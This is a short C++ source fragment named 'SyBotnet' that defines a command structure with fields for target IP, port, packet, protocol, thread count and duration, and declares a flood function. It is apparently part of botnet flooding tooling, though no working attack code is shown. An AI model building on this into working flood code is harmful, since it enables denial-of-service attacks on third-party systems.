/* =============================================== */
/* |  Name: SyBotnet --------------------------- | */
/* |  Decription: Using SyOKet Library           | */
/* |  Copyright: Copyright 2021 SeungYup26       | */
/* |  Github: SeungYup - @SeungYup26             | */
/* =============================================== */

#include"include/socket.hpp"

#include<chrono>
#include<cstring>

struct Data
{
	int  port;
	int  delay;
	int  thread;
	int  time;

	char command[16];
	char ip[16];
	char packet[1024];
	char proto[8];

	char first_option[128];
	char second_option[128];
};

void flood(Data data);